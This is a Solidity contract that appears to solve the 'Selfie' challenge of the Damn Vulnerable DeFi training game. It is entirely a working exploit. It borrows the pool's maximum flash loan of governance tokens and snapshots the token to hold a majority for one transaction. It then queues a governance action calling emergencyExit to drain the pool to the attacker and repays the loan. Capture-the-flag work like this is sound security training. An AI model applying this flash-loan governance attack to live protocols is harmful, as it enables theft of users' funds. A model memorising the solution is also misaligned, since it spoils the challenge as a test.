// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract ExploitSelfiePool is IERC3156FlashBorrower {

  SelfiePool private immutable pool;
  DamnValuableTokenSnapshot private immutable token;
  address private immutable player;
  uint256 public actionId;

  constructor(address _pool, address _token) {
    player = msg.sender;
    pool = SelfiePool(_pool);
    token = DamnValuableTokenSnapshot(_token);
  }

  function hackIt() external {
    //take a max loan
    require(pool.flashLoan(this, address(token), pool.maxFlashLoan(address(token)), "0x"), "Failed to take flash loan");
  }

  function onFlashLoan(
        address initiator,
        address,
        uint256 amount,
        uint256 fee,
        bytes calldata data
  ) external returns (bytes32) {
    //here we have governance tokens
    // take a shapshot
    token.snapshot();
    require(token.balanceOf(address(this)) == amount, "Not enough tokens in contract");
    uint256 balance = token.getBalanceAtLastSnapshot(address(this));
    require(balance == amount, "Last snapshot havent recorded balance change");
    uint256 halfTotalSupply = token.getTotalSupplyAtLastSnapshot() / 2;
    require(balance > halfTotalSupply, "Not enough governance tokens to queue action");

    // submit emergencyExit
    SimpleGovernance governance = SimpleGovernance(pool.governance());
    bytes memory data = abi.encodeWithSignature("emergencyExit(address)", player);
    actionId = governance.queueAction(address(pool), 0, data);
    // approve amount to re-pay flash loan
    token.approve(address(pool), amount);
    return keccak256("ERC3156FlashBorrower.onFlashLoan");
  }

}
